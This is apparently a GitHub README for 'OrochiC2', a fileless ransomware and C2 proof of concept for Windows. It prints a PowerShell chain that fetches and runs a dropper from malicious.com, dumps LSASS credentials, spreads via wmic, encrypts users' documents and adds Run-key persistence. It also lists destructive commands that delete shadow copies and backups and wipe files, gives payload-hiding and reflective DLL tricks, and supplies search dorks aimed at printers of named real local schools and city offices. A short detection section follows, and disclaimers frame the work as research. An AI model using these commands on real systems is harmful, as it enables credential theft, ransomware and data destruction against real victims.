

# OrochiC2: Fileless Malware Research (PoC)

> **Warning**  
> This project is **strictly for educational, authorized research, and penetration testing in isolated lab environments**.  
> **Never deploy or test on production or unauthorized systems.  
> The authors assume NO liability for misuse.**

---

<img src="https://github.com/user-attachments/assets/08948de4-0ae9-4863-8b74-0454bb3a1446" width="200">

---

## Table of Contents

- [About](#about)
- [Features](#features)
- [Getting Started](#getting-started)
  - [Prerequisites](#prerequisites)
  - [Build Instructions](#build-instructions)
- [Technical Overview](#technical-overview)
- [Attack Chain Example (PowerShell)](#attack-chain-example-powershell)
- [Reconnaissance and LOLBins](#reconnaissance-and-lolbins)
  - [Google Dork Examples](#google-dork-examples)
  - [Living Off the Land Binaries (LOLBins)](#living-off-the-land-binaries-lolbins)
- [Advanced Techniques](#advanced-techniques)
  - [Fileless Dropper Embedding](#fileless-dropper-embedding)
  - [Reflective DLL Injection](#reflective-dll-injection)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Destructive LOLBin Payloads](#destructive-lolbin-payloads)
- [Detection & Mitigation](#detection--mitigation)
- [Legal Disclaimer](#legal-disclaimer)
- [References & Further Reading](#references--further-reading)

---

## About

**Yamata-no-OrochiC2** is a proof-of-concept (PoC) research project simulating advanced fileless malware and C2 (Command & Control) techniques for Windows 10/11. It leverages "Living Off the Land" tactics, built-in system binaries (LOLBins), and public exploits to demonstrate stealthy attacks without touching disk.

**Primary Objectives:**
- Enable cybersecurity professionals and students to study fileless malware behavior.
- Support detection engineering, blue team training, and security research.
- Demonstrate the abuse of trusted Windows components for stealthy attacks.

---

## Technical Overview

This project focuses on simulating fileless ransomware and C2 attack chains, including:

- **Initial Access:** LOLBins download and execute payloads in memory.
- **Privilege Escalation:** Print Spooler & HiveNightmare exploitation.
- **Credential Access:** Dumping credentials from memory (e.g., LSASS).
- **Lateral Movement:** Native Windows protocols for network spread.
- **Impact:** Encrypting/wiping files, disabling recovery.

> **Note:** All techniques are for blue team and detection research purposes only.

---

## Attack Chain Example (PowerShell)

A staged simulation using only built-in Windows tools:

```powershell
# Initial Access: Load dropper
IEX(New-Object Net.WebClient).DownloadString("http://malicious.com/dropper.ps1")

# Decode and load in-memory payload
$bytes = [System.Convert]::FromBase64String("[Base64Payload]") 
[System.Reflection.Assembly]::Load($bytes)

# Privilege Escalation
Start-Process powershell -Args "-ExecutionPolicy Bypass -File C:\Temp\elevate.ps1" -Verb RunAs

# Credential Access
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# Lateral Movement
wmic /node:targetPC process call create "powershell.exe -File \\share\payload.ps1"

# File Encryption Example
$files = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.docx,*.pdf -Recurse
foreach ($file in $files) {
  $data = Get-Content $file.FullName -Raw
  $aes = New-Object System.Security.Cryptography.AesManaged
  $aes.Key = [Text.Encoding]::UTF8.GetBytes("RANDOM-GEN-KEY-1234567890123456")
  $aes.IV = New-Object byte[] 16
  $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
  Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
}

# Persistence
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
```

---

## Reconnaissance and LOLBins

### Google Dork Examples

Use search engines (SHODAN, FOFA) to find vulnerable printer services:

```
inurl:"/hp/device/this.LCDispatcher" "Moberly"
intitle:"Printer Status" "Moberly Public Schools"
intitle:"Web Image Monitor" inurl:"/wim" "Moberly"
inurl:"/printer/main.html" "City of Moberly"
intitle:"Web Jetadmin" "Moberly"
inurl:"/printers/" "Moberly"
intitle:"Konica Minolta" inurl:"/wcd/" "Moberly"
intitle:"PaperCut MF" "Moberly"
```

### Living Off the Land Binaries (LOLBins)

Trusted Windows binaries often abused for stealthy attacks:

```cmd
rundll32.exe \\10.10.X.X\shared\payload.dll,ReflectEntry
```

Attackers use `rundll32.exe`, `regsvr32.exe`, `powershell.exe` to execute payloads filelessly from network shares.

---

## Advanced Techniques

### Fileless Dropper Embedding

**Goal:** Hide payloads inside benign files, extract and execute with native tools.

1. **Embed Payload:**
    ```bash
    copy /b nsfw.jpg + payload.7z nsfw.jpg
    ```
2. **Extract & Decode:**
    ```cmd
    certutil -decode nsfw.jpg dropper.7z
    7z x dropper.7z -oC:\Users\Public\
    ```

### Reflective DLL Injection

Loads a malicious DLL directly in memory, evading disk forensics.

```cmd
rundll32.exe \\10.10.X.X\share\nsfw.dll,ReflectEntry
```

---

## MITRE ATT&CK Mapping

| Phase                | Technique                             | ID               | Description                               |
|----------------------|---------------------------------------|------------------|-------------------------------------------|
| Initial Access       | Valid Accounts / Drive-by Compromise  | T1078, T1189     | Compromising print interfaces             |
| Execution            | DLL Side-Loading / LOLBins            | T1218, T1055.001 | Running DLLs reflectively                 |
| Privilege Escalation | Print Spooler Exploits / Hive ACL     | T1068, T1003.002 | SYSTEM access, SAM hash extraction        |
| Defense Evasion      | Fileless Execution / Obfuscated Files | T1027, T1202     | Encoded payloads via certutil, mshta, etc |
| Credential Access    | LSASS Dumping / SAM Hive Access       | T1003            | Credential dumping                        |
| Lateral Movement     | SMB/Net Share Enumeration             | T1021.002        | Spread via printer shares                 |
| Impact               | Data Destruction / Encryption         | T1485, T1486     | Fileless wiperware via DLL payloads       |

---

## Destructive LOLBin Payloads

Demonstrate ransomware/wiper activity using only native binaries:

- **cipher.exe** — Wipe free space:  
  `cipher /w:C:\`
- **vssadmin.exe** — Delete shadow copies:  
  `vssadmin delete shadows /all /quiet`
- **wbadmin.exe** — Remove backups:  
  `wbadmin delete systemstatebackup -keepVersions:0`
- **bcdedit.exe** — Disable recovery:  
  `bcdedit /set {default} recoveryenabled No`
- **fsutil.exe** — Force dirty volume:  
  `fsutil dirty set C:`
- **wmic.exe** — Mass delete files:  
  `wmic process call create "cmd.exe /c del /f /s /q C:\Users\*.docx"`
- **forfiles.exe** — Timed wipe:  
  `forfiles /p C:\ /s /d -2 /c "cmd /c del /q @file"`
- **schtasks.exe** — Scheduled kill:  
  `schtasks /create /tn "Wipe" /tr "cmd /c del /f /q C:\*.xls" /sc once /st 23:59`
- **reg.exe** — Registry destruction:  
  `reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f`
- **certutil.exe** — Decode and detonate:  
  `certutil -decode payload.b64 wipe.exe && wipe.exe`

---

## Detection & Mitigation

### Detection

- **Sysmon + Sigma Rules:**
  - Monitor `rundll32.exe` and other LOLBins loading non-system DLLs.
  - Watch for abnormal use of `certutil.exe`, `regsvr32.exe`, `mshta.exe`.
  - Track unauthorized shadow volume access.
- **SIEM Correlation (ELK/Splunk):**
  - Alert on execution from network shares.
  - Parent/child process anomalies (e.g., `explorer.exe` spawning `rundll32.exe`).
  - Suspicious encoded PowerShell/CMD commands.

### Mitigation

- Disable Print Spooler where unnecessary:
    ```cmd
    Stop-Service -Name Spooler -Force
    Set-Service -Name Spooler -StartupType Disabled
    ```
- Apply all security patches, especially for Print Spooler and Hive ACL vulnerabilities.
- Restrict LOLBins via AppLocker or Windows Defender Application Control (WDAC).
- Deploy EDR/XDR solutions capable of detecting in-memory attacks and reflective loading.

---

## Legal Disclaimer

> All content, code, and techniques in this repository are provided solely for educational and authorized security research.  
> Any unauthorized use, distribution, or deployment is strictly prohibited.  
> Use responsibly and always comply with applicable laws and regulations.  
> **The authors bear NO liability for misuse.**

---

## References & Further Reading

- [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
- [LOLGEN – Generate LOLBin Chains](https://lolgen.hdks.org/)
- [Detecting SeriousSam (CVE-2021-36934)](https://medium.com/@mvelazco/detecting-serioussam-cve-2021-36934-with-splunk-855dcbb10076)
- [DLL Injection Primer](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
- [Print Spooler Exploit Chain](https://itm4n.github.io/printnightmare-not-over/)
- [Fileless Malware – Wikipedia](https://en.wikipedia.org/wiki/Fileless_malware)
- [PrintSpoofer (Original)](https://github.com/itm4n/PrintSpoofer/tree/master)
- [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)
- [MITRE ATT&CK T1055](https://attack.mitre.org/techniques/T1055/001/)
- [HiveNightmare Demo](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5)

---

**Stay safe, research responsibly, and always act within ethical and legal boundaries.**

